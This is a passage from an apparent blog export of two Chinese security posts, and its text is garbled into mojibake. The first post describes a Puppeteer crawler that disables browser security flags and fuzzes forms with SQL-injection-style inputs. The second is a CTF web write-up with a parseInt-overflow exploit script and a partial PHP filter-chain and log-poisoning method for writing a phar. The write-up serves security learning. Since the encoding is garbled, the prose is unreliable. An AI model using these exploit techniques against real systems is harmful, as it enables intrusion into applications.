ä¸ºè€å®è¯´å†™é¡¹ç›®è¿™ç‚¹ä¸Šè‡ªå·±æ›´å¤šæ˜¯ä»»åŠ¡é©±åŠ¨è€Œä¸æ˜¯ä¸»è§‚ä¸Šå¸Œæœ›å®ç°ä»€ä¹ˆ)ã€‚ä»æœ€ç»ˆç»“æœæ¥çœ‹,æˆ‘è®¤ä¸ºå¤§ä½“ä¸Šæ˜¯ä»¥æ­é…è¢«åŠ¨æ‰«æå™¨ä¸ºç›®çš„,å³æŠŠæ‰«æå™¨ä½œä¸ºcrawlerçš„ä»£ç†ã€‚è¿™æ ·çš„è¯,çˆ¬è™«çš„è¦æ±‚å°±åº”è¯¥æ˜¯å°½å¯èƒ½å¤šçš„è§¦å‘äº‹ä»¶ï¼Œå°½å¯èƒ½å¤šçš„æœé›†urlã€‚ ç›®å‰çœ‹æ¥github ä¸Šæ¯”è¾ƒå—æ¬¢è¿çš„æ˜¯ crawlergo è·Ÿ LSpider,å„æœ‰ç‰¹è‰²ã€‚æˆ‘ä¸ªäººä¸»è¦æ˜¯æŒ‰ç…§LFYçš„æ€è·¯ä»¥åŠå‡ ç¯‡å‚è€ƒæ–‡ç« å®è·µçš„ã€‚ åˆå§‹åŒ–puppeteer çš„å¯åŠ¨å‚æ•°ä¸Šï¼Œä¸»è¦æ˜¯æ³¨æ„å…³é—­XSS Auditorå¹¶å…è®¸ä¸å®‰å…¨å†…å®¹ã€‚å½“ç„¶è¿˜æœ‰æ¯”è¾ƒé‡è¦çš„å…³gpu,no-sandboxç­‰ç­‰,ä¸»è¦æ˜¯ä¸ºäº†èŠ‚çº¦èµ„æºã€‚ 123456789101112131415&#123; \"puppeteerOptions\": \"args\": [ \"--disable-gpu\", \"--disable-dev-shm-usage\", \"--disable-web-security\", \"--disable-xss-auditor\", \"--no-zygote\", \"--no-sandbox\", \"--disable-setuid-sandbox\", \"--allow-running-insecure-content\", \"--disable-webgl\", \"--disable-popup-blocking\" ]&#125; ç„¶åå°±æ˜¯å¸¸è§„çš„pageè®¾ç½®ã€‚UAè®¾ç½®ä¸ºéšæœºUAä¸å¿…å¤šè¯´ï¼Œæ¯”è¾ƒé‡è¦çš„æ˜¯å¼€å¯requestæ‹¦æˆªä»¥åŠæ³¨å…¥hookä»£ç ã€‚è¿™äº›ä¼šåœ¨ä¸‹é¢è°ˆåˆ°ã€‚ hookJS æˆ‘ä»¬éœ€è¦åœ¨domæ„å»ºä¹‹å‰å°±hook Javascriptã€‚è¿™ä¸€æ­¥çš„ç›®çš„å½“ç„¶æ˜¯ä¸ºäº†åœ¨domæ„å»ºä¹‹å‰å°±å°½å¯èƒ½å¤šçš„æ”¶é›†url.æ‰€ä»¥ä¸Šé¢ä½¿ç”¨await page.evaluateOnNewDocument(hookJS);æ¥åœ¨é¡µé¢åŠ è½½å‰æ³¨å…¥ JavaScript ä»£ç ã€‚ å…·ä½“hookæ€è·¯å¾ˆç®€å•,ä¸€äº›æœ‰å¯èƒ½å¯¼è‡´é¡µé¢é‡å®šå‘æˆ–è€…é˜»å¡çš„å‡½æ•°å¦‚window.openæˆ–window.closeï¼Œæˆ‘ä»¬æŠŠå®ƒhookäº†;(å…¶å®å¼¹çª—ä¹Ÿä¼šé˜»å¡,ä¸è¿‡æˆ‘ä»¬æœ‰ä¸“é—¨çš„apiæ¥å…³é—­å¼¹çª—ã€‚)ä¸€äº›å‚æ•°é‡Œæœ‰urlçš„æˆ‘ä»¬è·å–åˆ°å‚æ•°å­˜èµ·æ¥ç„¶åæ­£å¸¸æ‰§è¡Œ;ä¸€äº›åƒè¶…æ—¶çš„ä»£ç å¦‚setTimeout,setInterValæˆ‘ä»¬æŠŠå®ƒæ—¶é—´æ§åˆ¶åœ¨1så¤šã€‚ (æ³¨æ„è¿™ä¸¤ä¸ªå‡½æ•°å‚æ•°éƒ½æ˜¯ms) é™¤æ­¤ä»¥å¤–è¿˜éœ€è¦hook äº‹ä»¶æ³¨å†Œã€‚åˆšå¥½å€Ÿæ­¤å­¦ä¹ åˆ°äº†äº‹ä»¶æ³¨å†Œçš„ä¸¤ç§æ–¹å¼ã€‚ ä¸€ç§æ˜¯æ—©æœŸçš„dom0æ³¨å†Œ å½“ç„¶è¿™ç§æ–¹å¼å·²ç»è¿‡æ—¶äº†ï¼Œæ‰€ä»¥æˆ‘æ‰€äº†è§£åˆ°çš„æ›´å¤šæ˜¯ç¬¬äºŒç§æ³¨å†Œæ–¹å¼addEventListener,å³dom2çº§æ³¨å†Œã€‚ 123456function bgChange() &#123; const rndCol = 'rgb(' + random(255) + ',' + random(255) + ',' + random(255) + ')'; document.body.style.backgroundColor = rndCol;&#125;btn.addEventListener('click', bgChange); æ‰€ä»¥hookä¸¤ç§äº‹ä»¶çš„æ–¹å¼å½“ç„¶å°±ä¸åŒäº†ï¼Œå‰è€…æ˜¯è®¾ç½®è®¿é—®å™¨å±æ€§,åè€…ç›´æ¥hook addEventListeneråŸå‹å³å¯ã€‚ å…·ä½“å‚è€ƒ https://www.anquanke.com/post/id/178339#h2-2 è¿™é‡ŒhookJS æ‰§è¡Œçš„contextæ˜¯åœ¨æµè§ˆå™¨,ä¸èƒ½åœ¨ä»£ç é‡Œç›´æ¥é€šè¿‡globalç­‰æ–¹æ³•è·å–åˆ°hookçš„url.æ‰€ä»¥æ–¹æ³•å°±æ˜¯hookæ—¶æŠŠç»“æœå­˜å¥½,æ¯”å¦‚å­˜åˆ°windowé‡Œï¼Œé¢å¤–page.evaluate( () =&gt; return window.foo)å³å¯ã€‚ hook Navigation å‰ç«¯å¯¼èˆªæ˜¯è¿™æ¬¡è‡ªå·±å›°æƒ‘æœ€ä¹…çš„åœ°æ–¹ã€‚æœ¬èº«ä¹Ÿæ˜¯ä¸€ä¸ªéš¾ç‚¹ã€‚ä» https://www.anquanke.com/post/id/178339#h2-7 è¿™é‡Œå¯ä»¥çŸ¥é“ï¼Œæˆ‘ä»¬ä¸€èˆ¬å¸Œæœ›è‡ªå·±çš„é¡µé¢ä¸ä¼šéšä¾¿å°±è·³è½¬ï¼Œä½†æ˜¯hook window.locationæ˜¯ä¸å¯è¡Œçš„ï¼Œå› ä¸ºé»˜è®¤locationå±æ€§çš„configurableé€‰é¡¹æ˜¯falseã€‚ æ–‡ä¸­æåˆ°ä¸€ç§ï¼Œç”±äºå¼€å¯äº†interception,åªè¦ä¿®æ”¹è¿”å›å€¼ä¸º204å°±å¥½äº†ã€‚ 204æ„æ€æ˜¯ï¼ŒæœåŠ¡ç«¯è¯´æ˜æ“ä½œå·²ç»æ‰§è¡ŒæˆåŠŸï¼ŒåŒæ—¶å‘Šè¯‰æµè§ˆå™¨ä¸éœ€è¦ç¦»å¼€å½“å‰çš„æ–‡æ¡£å†…å®¹ ä½†æ˜¯æˆ‘åœ¨è‡ªå·±å°è¯•æ—¶å‘ç°ï¼Œå¹¶æ²¡æœ‰è¾¾åˆ°é¢„æœŸæ•ˆæœã€‚ä¾‹å¦‚ï¼š 12345&lt;script&gt;window.location = '/test1';window.location = '/test2';window.location = '/test3';&lt;/script&gt; å¯¹äºä¸Šé¢è¿™ä¸ªä¾‹å­ï¼Œç†è®ºä¸Šæˆ‘ä»¬å¿…é¡»è·å–åˆ°ä¸‰ä¸ªè·³è½¬é“¾æ¥ã€‚ç„¶è€Œå®é™…ä¸Šæ— è®ºæ˜¯å¼€æ‹¦æˆªè¿˜æ˜¯äººå·¥å¼€è¿™ä¸ªé¡µé¢ï¼Œæµè§ˆå™¨éƒ½åªä¼šæ‰§è¡Œæœ€åä¸€ä¸ªè·³è½¬ã€‚å› ä¸ºå‰ä¸¤ä¸ªéƒ½ä¼šè¢«ä¸‹ä¸€ä¸ªè·³è½¬ä¸­æ–­ã€‚ æœ€ç»ˆæƒè¡¡äº†ä¸‹ï¼Œä½¿ç”¨äº†https://github.com/myvyang/chromium_for_spider/releases è¿™é‡Œé‡æ–°ç¼–è¯‘æºç çš„chromiumã€‚å®ƒæŠŠä¸Šè¿°å‰ç«¯å¯¼èˆªçš„urlå…¨éƒ½é”åˆ°window.info é‡Œäº†ã€‚è§£å†³äº†é—®é¢˜ï¼Œä½†æ˜¯windowsä¸‹å°±ä¸èƒ½ç”¨äº†ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ æ”¹ç”¨dalaoçš„ https://github.com/myvyang/chromium_for_spiderä¿®æ”¹è¿‡æºç çš„çˆ¬è™«åã€‚é¡µé¢é»˜è®¤ä¸ä¼šè·³è½¬äº†ï¼Œå¹¶ä¸”å¾…è·³è½¬çš„urlç›´æ¥åœ¨window.infoé‡Œã€‚ å¦å¤–éœ€è¦å®ç°çš„æ˜¯,å¯¹äºè¯·æ±‚é‡ŒåŒ…å«å›¾ç‰‡èµ„æºçš„ï¼Œæˆ‘ä»¬éœ€è¦è¿”å›è‡ªå·±çš„å›¾ç‰‡é¿å…ä¸å¿…è¦çš„åŠ è½½ã€‚å¯¹äºåŒ…å«logoutè¯·æ±‚çš„æˆ‘ä»¬æŠŠå®ƒabortæ‰ã€‚å› ä¸ºå¦‚æœçˆ¬è™«çš„cookieå› ä¸ºlogoutæ¸…é™¤äº†å°±ä¼šå¯¼è‡´çˆ¬çš„ä¿¡æ¯å˜å°‘ã€‚æ‰€ä»¥éœ€è¦å¤„ç†ã€‚ è¿˜æœ‰ä¸€ä¸ªå‘,æˆ‘ä»¬æƒ³è¾¾åˆ°çš„ç›®çš„æ˜¯ï¼š å‰ç«¯é‡å®šå‘å…¨éƒ¨å–æ¶ˆï¼Œå¹¶è®°å½•ä¸‹ç›®æ ‡é“¾æ¥æ”¾å…¥ä»»åŠ¡é˜Ÿåˆ—åç«¯é‡å®šå‘å“åº”çš„bodyä¸­ä¸åŒ…å«å†…å®¹ï¼Œåˆ™è·Ÿéšè·³è½¬åç«¯é‡å®šå‘å“åº”çš„bodyä¸­å«æœ‰å†…å®¹ï¼Œæ— è§†é‡å®šå‘ï¼Œæ¸²æŸ“bodyå†…å®¹ï¼Œè®°å½•ä¸‹locationçš„å€¼æ”¾å…¥ä»»åŠ¡é˜Ÿåˆ— è¿™é‡Œé’ˆå¯¹åç«¯è·³è½¬, ç”±äºæˆ‘é‡‡ç”¨çš„æ˜¯ç›‘å¬response äº‹ä»¶,æ‰€ä»¥å“åº”å…¶å®åº”è¯¥å·²ç»è¿”å›äº†ã€‚è¿™ä¸è¶³ä»¥åšåˆ°bodyä¸­å«æœ‰å†…å®¹ä¸è·Ÿéšè·³è½¬ã€‚æ‰€ä»¥è¿˜æ˜¯å¾—è‡ªå·±å®ç°,è¿™é‡Œæˆ‘ç”¨node-fetchæ¥åˆ¤æ–­è¿”å›å†…å®¹ã€‚æ— å†…å®¹ç›´æ¥è·Ÿéšï¼Œæœ‰çš„è¯å°±æ‰‹åŠ¨è®¾ç½®å“åº”çŠ¶æ€ç ä¸º200ã€‚ æ”¶é›†link &amp;&amp; æ³¨é‡Š è¿™ä¸€éƒ¨åˆ†åšçš„æ˜¯æ”¶é›†å„ç§domæ„å»ºå¥½ä¹‹åçš„linkä¸hrefç­‰ç­‰ä¼šåŒ…å«çš„url.ä¹‹åä¹Ÿä¼šå°†å…¶åŠ å…¥åˆ°é˜Ÿåˆ—ä¸­,åšèµ·æ¥è¿˜æ˜¯æ¯”è¾ƒè½»æ¾çš„ã€‚ const links = await page.$$eval(&#39;[src],[href],[action],[data-url],[longDesc],[lowsrc]&#39;, getLink); è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯baseæ ‡ç­¾æ˜¯å¦å­˜åœ¨ã€‚å¦‚æœæœ‰baseæ ‡ç­¾çš„è¯ä¼˜å…ˆæŠŠbaseä½œä¸ºæ•´ä¸ªpageçš„baseURlè½½å…¥,ç„¶åæ”¶é›†å„ç§é“¾æ¥(å¯èƒ½æœ‰ç›¸å¯¹é“¾æ¥)parseå³å¯ã€‚nodejs çš„URLç±»æ„é€ å‡½æ•°æ¥æ”¶çš„ä¸¤ä¸ªå‚æ•°åˆšå¥½å°±æ˜¯inputå’Œbase,æ¯”è¾ƒå¥½çš„è§£å†³äº†ç›¸å¯¹é“¾æ¥çš„é—®é¢˜ã€‚ ç„¶åæ˜¯comment çš„è¯†åˆ«ã€‚æœ‰æ—¶å€™æ³¨é‡Šé‡Œä¼šå­˜åœ¨éšè”½çš„æ¥å£ï¼Œå¾€å¾€æ˜¯è§£å†³é—®é¢˜çš„å…¥æ‰‹ç‚¹ã€‚è¿™é‡Œç”¨xapthè¯†åˆ«å‡ºæ¥å¹¶ä¸”æ­£åˆ™åŒ¹é…å‡ºurlå³å¯.æ¯”è¾ƒå°´å°¬çš„æ˜¯æ­£åˆ™åªèƒ½åŒ¹é…å®Œæ•´çš„url,å› ä¸ºç„å­¦é—®é¢˜æ²¡åŒ¹é…åˆ°ç›¸å¯¹è·¯å¾„ï¼Œé‚æ”¾å¼ƒã€‚ è¡¨å•è¾“å…¥ä»¥åŠæäº¤ã€‚ è¡¨å•ä¿¡æ¯çš„å¡«å†™ä»¥åŠæäº¤ã€‚è¿™é‡Œå…¶å®è¿˜å¥½ï¼Œæ²¡å•¥å‘ã€‚ä¸»è¦å°±æ˜¯æ ¹æ®å„ç§è¡¨å•ç±»å‹ï¼Œè¾“å…¥ç±»å‹æ¥å¸¸è¯†æ€§çš„fuzzä¸€äº›å¯èƒ½å¯¼è‡´æ¼æ´çš„è¾“å…¥ï¼Œæ¯”å¦‚å°è¯•sqlæ³¨å…¥ç­‰ã€‚ å…·ä½“ä»£ç å®ç°ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥å…ˆç”¨$$æ‹¿åˆ°è¡¨å•çš„node.å¯¹äºæ¯ä¸ªè¡¨å•nodeæˆ‘ä»¬å»è·å–å®ƒå¯èƒ½çš„è¾“å…¥ï¼ŒåŒ…æ‹¬input, select, textarea, datalistç­‰ã€‚æ ¹æ®ä¸åŒç±»å‹çš„node,æˆ‘ä»¬çš„å¤„ç†å½“ç„¶ä¸åŒã€‚ä½†æ˜¯èƒ½è¾“å…¥æ–‡å­—çš„å½“ç„¶æ˜¯å°è¯•ä¸€äº›fuzzæ€§è´¨çš„è¾“å…¥ã€‚å‡å¦‚è¿™ä¸ªnodeçš„è¾“å…¥ç±»å‹æ˜¯å¯ä»¥æ¨æ–­çš„ï¼Œæˆ‘ä»¬å°±å°½å¯èƒ½è¾“å…¥æ¯”è¾ƒåˆç†çš„å†…å®¹ã€‚ä¾‹å¦‚éœ€è¦è¾“å…¥é‚®ç®±çš„åœ°æ–¹ï¼Œclass,name,idç­‰ç­‰å¯èƒ½ä¼šåŒ…å«email,æˆ‘ä»¬æå–å‡ºæ¥å°±å¯ä»¥è¾“å…¥äº†ã€‚ æ­¤å¤„å­¦åˆ°çš„ä¸€ä¸ªæƒ³æ³•æ˜¯ï¼Œå¯¹äºè¡¨å•æäº¤æˆ‘ä»¬å¯ä»¥å¦å¤–å¼€ä¸€ä¸ªiframe,æ¥æ”¶è¡¨å•æäº¤ã€‚ç”±äºè¿™é‡Œchromiumå·²ç»é”ä½å„ç§å¯¼èˆªäº†,æäº¤çš„urlæˆ‘ä»¬å½“ç„¶ä¹Ÿèƒ½æ”¶é›†åˆ°ã€‚ äº‹ä»¶è§¦å‘äº‹ä»¶è§¦å‘çš„æ€è·¯å°±æ˜¯ï¼Œå°½å¯èƒ½å»è§¦å‘æ‰€æœ‰å·²æ³¨å†Œçš„äº‹ä»¶ã€‚ dom event trigger å¯¹äºæœ€æ—©hookçš„dom event, æˆ‘ä»¬ç›´æ¥è§¦å‘ã€‚ç”±äºæœ€æ—©hook jsæ—¶å·²ç»æ”¶é›†è¿‡ä¸€äº›dom çš„äº‹ä»¶äº†ã€‚æ‰€ä»¥è¿™é‡Œç›´æ¥æå–,ç”¨dispatchEventè§¦å‘å³å¯ã€‚ 123let newEvent = document.createEvent('CustomEvent');newEvent.initCustomEvent(event[\"eventName\"], true, true, null);event[\"element\"].dispatchEvent(newEvent); inline event trigger é™¤äº†domäº‹ä»¶è§¦å‘,æˆ‘ä»¬è¿˜éœ€è¦è§¦å‘å†…è”äº‹ä»¶ï¼Œä»€ä¹ˆæ˜¯å†…è”äº‹ä»¶å‘¢ï¼Ÿè¿™é‡Œå­˜åœ¨ä¸€ä¸ªäº‹ä»¶æ•è·ä¸å†’æ³¡æœºåˆ¶çš„é—®é¢˜ã€‚ æµè§ˆå™¨æ£€æŸ¥å®é™…ç‚¹å‡»çš„å…ƒç´ æ˜¯å¦åœ¨å†’æ³¡é˜¶æ®µä¸­æ³¨å†Œäº†ä¸€ä¸ªonclickäº‹ä»¶å¤„ç†ç¨‹åºï¼Œå¦‚æœæ˜¯ï¼Œåˆ™è¿è¡Œå®ƒç„¶åå®ƒç§»åŠ¨åˆ°ä¸‹ä¸€ä¸ªç›´æ¥çš„ç¥–å…ˆå…ƒç´ ï¼Œå¹¶åšåŒæ ·çš„äº‹æƒ…ï¼Œç„¶åæ˜¯ä¸‹ä¸€ä¸ªï¼Œç­‰ç­‰ï¼Œç›´åˆ°å®ƒåˆ°è¾¾&lt;html&gt;å…ƒç´ ã€‚ (è·Ÿdispatchçš„æœºåˆ¶æœ‰ç‚¹åƒã€‚) é»˜è®¤æƒ…å†µä¸‹ï¼Œæ‰€æœ‰äº‹ä»¶å¤„ç†ç¨‹åºéƒ½åœ¨å†’æ³¡é˜¶æ®µè¿›è¡Œæ³¨å†Œã€‚æ‰€ä»¥äº‹ä»¶ä¼šå­˜åœ¨ä¸€ä¸ªpropogateçš„è¿‡ç¨‹ã€‚æˆ‘ä»¬å‡å¦‚ç»™æŸä¸ªåµŒå¥—divçš„æœ€å¤–å±‚æ³¨å†Œäº†äº‹ä»¶ï¼Œé‚£ä¹ˆç‚¹å‡»å®ƒçš„å­èŠ‚ç‚¹å…¶å®ä¹Ÿä¼šè§¦å‘è¿™ä¸€äº‹ä»¶ã€‚ æ‰€ä»¥ï¼Œè¿™é‡Œæˆ‘ä»¬å¯¹äºå†…è”äº‹ä»¶çš„å¤„ç†æ–¹å¼æ˜¯ï¼šå…ˆæŒ‰ç…§å¸¸è§äº‹ä»¶è·å–åˆ°èŠ‚ç‚¹ã€‚è§¦å‘å®Œåï¼Œå¯¹å…¶æ¯å±‚å­èŠ‚ç‚¹ä¹Ÿå°è¯•è§¦å‘ä¸‹ï¼Œè¿™ä¸ªå±‚æ•°é™åˆ¶æ˜¯3å±‚ã€‚ 12345678910const fireInlineEvent = (node, eventName) =&gt; &#123; console.log(`Triggering Inline event $&#123;eventName&#125;`) let event = document.createEvent(\"CustomEvent\"); event.initCustomEvent(eventName, false, true, null); try &#123; node.dispatchEvent(event); &#125; catch (err) &#123; console.log(err); &#125;&#125; æˆ‘ä»¬initCustomEventçš„ç¬¬äºŒä¸ªå‚æ•°æ˜¯canBubble.ä»£è¡¨å®ƒæ˜¯å¦ä¼šå†’æ³¡ã€‚ è¿™é‡Œå…³æ‰headlessçœ‹ä¸‹æ•ˆæœå¦‚ä½•ã€‚æˆ‘çš„æµ‹è¯•é¡µé¢æ˜¯ 1234567891011121314&lt;div id=\"div1\" onclick=\"console.log(1)\"&gt; Test Div1 &lt;div class=\"a\"&gt; Div1 Child1 &lt;div class=\"b\"&gt;Div1 Child1 Child1&lt;/div&gt; &lt;/div&gt;&lt;/div&gt;&lt;div id=\"div2\"&gt;Test Div2&lt;/div&gt;&lt;script&gt; div2.onclick = () =&gt; console.log(233); div1.addEventListener('click', function setup(e) &#123; console.log('No'); &#125;);&lt;/script&gt; å¯ä»¥çœ‹åˆ°è§¦å‘äº†3æ¬¡ã€‚ä¸”åä¸¤æ¬¡ç”±äºæ²¡æœ‰å†’æ³¡å¹¶ä¸ä¼šè§¦å‘console.log(1) å…¥é˜Ÿ &amp;&amp; urlå»é‡ä¸Šè¿°æ‰€æœ‰æ“ä½œåšå®Œå,åº”è¯¥å°±æ”¶é›†åˆ°è¶³å¤Ÿå¤šçš„urlå¹¶è§¦å‘äº†å°½å¯èƒ½å¤šçš„äº‹ä»¶äº†ã€‚æŠŠä»–ä»¬å…¥é˜Ÿï¼Œclusterå°±ä¼šå¦å¤–å¼€ä¸€ä¸ªçº¿ç¨‹ç»§ç»­æ‰§è¡Œæˆ‘ä»¬çš„ä»»åŠ¡ã€‚ å½“ç„¶è¿™æ ·å°±å­˜åœ¨ä¸€ä¸ªurlåˆ¤æ–­ä¸å»é‡çš„é—®é¢˜ã€‚å¯¹äºåˆ¤æ–­ï¼Œæˆ‘æ˜¯é‡‡å–åªçˆ¬è¾“å…¥åŸŸååŠå…¶å­åŸŸåçš„æ–¹å¼,å¦åˆ™ä¸å…¥é˜Ÿï¼›è€Œå»é‡è¿™ç‚¹å°±æ¯”è¾ƒé‡è¦äº†ï¼Œæ¯”å¦‚æˆ‘å°è¯•çˆ¬äº†ä¸‹baidu,ç»“æœæ”¶é›†åˆ°å‡ ç™¾ä¸ªé“¾æ¥ï¼Œç»§ç»­å…¥é˜Ÿåçˆ¬çš„åˆå‡ ä¹æ˜¯é‡å¤çš„url,æ˜¾ç„¶æ˜¯åœ¨åšæ— ç”¨åŠŸã€‚æˆ‘ç›®å‰å•é’ˆå¯¹urlå¾ˆä¸ä¼˜é›…çš„è§£å†³æ–¹æ¡ˆå°±æ˜¯ç”¨Setæ•°æ®ç»“æ„ç»´æŠ¤ç‹¬ç«‹æ€§ã€‚ä½†æ˜¯å‡å¦‚å·¥ç¨‹é¡¹ç›®çš„è¯è‚¯å®šæ˜¯è¦ç”¨åˆ°redisé›†åˆäº†ã€‚ä¸è¿‡è¿™æ ·ä¸€ä¸ªç®€å•çˆ¬è™«åº”è¯¥ç”¨ä¸åˆ°æ•°æ®åº“å§( Summaryæ€»çš„æ¥è¯´å†™è¿™ä¸ªçˆ¬è™«ä¸»è¦æ˜¯é”»ç‚¼ä¸‹æŠ€æœ¯ä»¥åŠå®è·µä¸‹æ–‡ç« ï¼Œå¯ä»¥è¯´è¿˜æ˜¯å­¦åˆ°ä¸å°‘çŸ¥è¯†çš„ã€‚å‡å¦‚è¿™ç¯‡æ–‡ç« æˆ–è€…é¡¹ç›®æœ‰å¸®åˆ°ä½ çš„åœ°æ–¹é‚£å°±ç‚¹ä¸ªstar å§ :)ã€‚https://github.com/baiyecha404/Dynamic-Crawler è¯´ä¸å®šè¿˜å¯ä»¥ä¼˜åŒ–ä¸‹ã€‚ Referenceshttps://github.com/LFYSec/CrawlerNode https://github.com/Passer6y/CrawlerVuln https://github.com/myvyang/chromium_for_spider https://www.anquanke.com/post/id/178339 http://blog.fatezero.org/2018/04/09/web-scanner-crawler-02/","categories":[],"tags":[{"name":"Node.js","slug":"Node-js","permalink":"https://www.bycsec.top/tags/Node-js/"}]},{"title":"æ˜¥ç§‹æ¯-WEB","slug":"æ˜¥ç§‹æ¯-WEB","date":"2021-05-29T16:56:35.000Z","updated":"2021-05-29T16:59:59.915Z","comments":true,"path":"2021/05/30/æ˜¥ç§‹æ¯-WEB/","link":"","permalink":"https://www.bycsec.top/2021/05/30/%E6%98%A5%E7%A7%8B%E6%9D%AF-WEB/","excerpt":"å‘¨æœ«çœ‹pwn2winçš„é—´éš™åšäº†ä¸‹æ˜¥ç§‹æ¯çš„webã€‚ä»ç»“æœä¸Šçœ‹é¢˜ç›®è´¨é‡è¿˜å¯ä»¥ï¼Œä¹Ÿæ‹¿äº†2ä¸ªä¸‰è¡€ã€‚æœ¬æ¥ä»¥ä¸ºå¯ä»¥ak webçš„ï¼Œä½†æ˜¯å› ä¸ºæœ€åä¸€é¢˜è¿œç¨‹ç¯å¢ƒå¤ªå¡äº†ï¼Œæ‰€ä»¥æ²¡åœ¨æ¯”èµ›æ—¶é—´å†…åšå‡ºæ¥ã€‚å› æ­¤è¿™é‡Œæ€»ç»“æ€§åœ°ä»‹ç»ä¸‹è§£ä¸‰ä¸ªwebçš„æ–¹æ³•æ€è·¯ã€‚","text":"å‘¨æœ«çœ‹pwn2winçš„é—´éš™åšäº†ä¸‹æ˜¥ç§‹æ¯çš„webã€‚ä»ç»“æœä¸Šçœ‹é¢˜ç›®è´¨é‡è¿˜å¯ä»¥ï¼Œä¹Ÿæ‹¿äº†2ä¸ªä¸‰è¡€ã€‚æœ¬æ¥ä»¥ä¸ºå¯ä»¥ak webçš„ï¼Œä½†æ˜¯å› ä¸ºæœ€åä¸€é¢˜è¿œç¨‹ç¯å¢ƒå¤ªå¡äº†ï¼Œæ‰€ä»¥æ²¡åœ¨æ¯”èµ›æ—¶é—´å†…åšå‡ºæ¥ã€‚å› æ­¤è¿™é‡Œæ€»ç»“æ€§åœ°ä»‹ç»ä¸‹è§£ä¸‰ä¸ªwebçš„æ–¹æ³•æ€è·¯ã€‚ ctfakertypescriptæºç ç»™å‡ºæ¥äº†ã€‚ä»”ç»†çœ‹ä¼šå‘ç°å…¶å®å¯æ§ç‚¹åªæœ‰/levelupä¸€å¤„ï¼Œæ‰€ä»¥å¿«é€Ÿå®šä½åˆ°factorä¸Š factorç”±å¯æ§å€¼ç»parseIntå¤„ç†ã€‚è€ŒparseInt æœ‰ä¼ å­—ç¬¦ä¸²æˆ–ç§‘å­¦è®¡æ•°æ³•è¢«æˆªæ–­çš„ç‰¹æ€§ã€‚é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥è®©å±æ€§å˜å¾—è¶³å¤Ÿå¤§ã€‚ä¸€æ¬¡æ‰“è´¥æ‰€æœ‰æ€ªå…½ parseInt(&#39;99999999999999e-40&#39;) == 99999999999999 123456789# coding: utf-8# -**- author: byc_404 -**-url = 'xxx'r = requests.post(url + 'levelup', json = &#123; 'f':'99999999999999e-40'&#125;)r = requests.get(url+'fight')r = requests.get(url+'monster')print(r.text) easyfilteræˆ‘ä»¬å¯ä»¥çœ‹åˆ°å…³é”®ä»£ç  å…¶å®ç†Ÿæ‚‰çš„å°±åº”è¯¥çŸ¥é“ï¼Œè¿™æ˜¯laravel8 debug modeä¸‹æ¼æ´ä»£ç çš„ç®€åŒ–ç‰ˆã€‚å³è¿›è¡Œä¸€ç»„å¯æ§çš„file_get_contents + file_put_contentsã€‚laravel8 çš„æ´å¦‚æœæ²¡æœ‰è·Ÿè¿‡çš„è¯ï¼Œè¿˜æ˜¯å»ºè®®çœ‹ä¸€ä¸‹ã€‚å¾ˆå¥½çš„è¿ç”¨äº†phpå„ç§filterçš„æ€§è´¨ã€‚ å›åˆ°æœ¬é¢˜ã€‚æˆ‘ä»¬å¯ä»¥åŒæ ·é‡‡ç”¨è¿™ä¸ªæ€è·¯ï¼Œå…ˆé€šè¿‡æŠ¥é”™æ‰‹æ®µåˆ›å»ºlogæ–‡ä»¶ã€‚ çœ‹ä¸€ä¸‹logæ ¼å¼ã€‚ è™½ç„¶è·Ÿlaravelä¸å¤ªä¸€æ ·ï¼Œä½†è¿˜æ˜¯èƒ½ç”¨ç±»ä¼¼æ‰‹æ®µå¤„ç†çš„ã€‚è¿™é‡Œæˆ‘ç®€å•æä¸€ä¸‹laravelçš„æ€è·¯ 1.convert.base64-decode è¿‡æ»¤å™¨å¯ä»¥ç›´æ¥æŠŠébase64å­—ç¬¦å¤„ç†æ‰2.convert.iconv.utf-16le.utf-8 å¯ä»¥æŠŠutf-16è½¬utf-8ã€‚è¿™ä¸€æ­¥å¯ä»¥å°†å¾ˆå¤šæ­£å¸¸å­—ç¬¦è½¬æˆä¹±ç  é‚£ä¹ˆä¼¼ä¹ï¼Œæˆ‘ä»¬å¯ä»¥å°†payloadçš„base64ç¼–ç è¿›è¡Œutf-16ç¼–ç å†™å…¥log,ç„¶åå…ˆç”¨convert.iconv.utf-16le.utf-8è¿‡æ»¤å™¨ï¼Œä½¿å¾—logä¸­åªæœ‰base64-payloadæ˜¯æ­£å¸¸base64å­—ç¬¦é›†å†…çš„ã€‚ç„¶åç”¨convert.base64-decodeå¤„ç†,å°±åªå‰©ä¸‹payloadäº†ã€‚ ä½†æ˜¯ï¼Œç”±äºæˆ‘ä»¬çš„ç›®çš„æ˜¯å†™å…¥phar.é‡Œé¢å«æœ‰%00.æ‰€ä»¥æˆ‘ä»¬è¿˜éœ€è¦æ‰¾åˆ°å†™å…¥%00çš„æ–¹æ³•ã€‚æ–¹æ¡ˆå°±æ˜¯ä½¿ç”¨php filterçš„å†…ç½®è¿‡æ»¤å™¨convert.quoted-printable-decode.å®ƒçš„encodeå°±æ˜¯ç¼–ç æˆ={å­—ç¬¦asciiç },æ‰€ä»¥æˆ‘ä»¬å¯ä»¥å°†ç©ºå­—èŠ‚æŒ‰=00å†™å…¥ã€‚ ç¬¬ä¸€æ­¥æ¸…logçš„è¯ç”¨ambionicsçš„æ–¹æ³•å°±è¡Œã€‚ç¬¬äºŒæ­¥æˆ‘åœ¨å°è¯•ç›´æ¥ç…§æ¬å¤±è´¥åï¼Œæƒ³åˆ°äº†ä¸å¦‚ç›´æ¥å†™å…¥payloadã€‚ç”±äºè¿™é‡Œfileå‚æ•°æ˜¯getä¼ çš„,æŠ¥é”™å†™åˆ°logé‡Œæ—¶å‚æ•°è¢«urlç¼–ç äº†,æ•´ä¸ªlogé‡Œä¹Ÿä¼šæœ‰ä¸€ä¸ªæˆ‘ä»¬åŸå§‹çš„payload + ä¸€ä¸ªurlç¼–ç åçš„payloadã€‚ä¸è¿‡ç”±äºthinkphpè¿™é‡Œçš„logæŠŠhttpè¯·æ±‚çš„è·¯å¾„å‚æ•°ç­‰éƒ½å¸¦ä¸Šäº†ã€‚æ‰€ä»¥æˆ‘å°±ç›´æ¥socketå‘åŒ…ï¼ŒæŠŠpayloadçš„ä½ç½®æ§åˆ¶åœ¨fileåé¢ï¼Œä¿è¯logé‡Œåªæœ‰ä¸€å¤„payload,ä¸”ä¸ä¼šè¢«ç¼–ç . 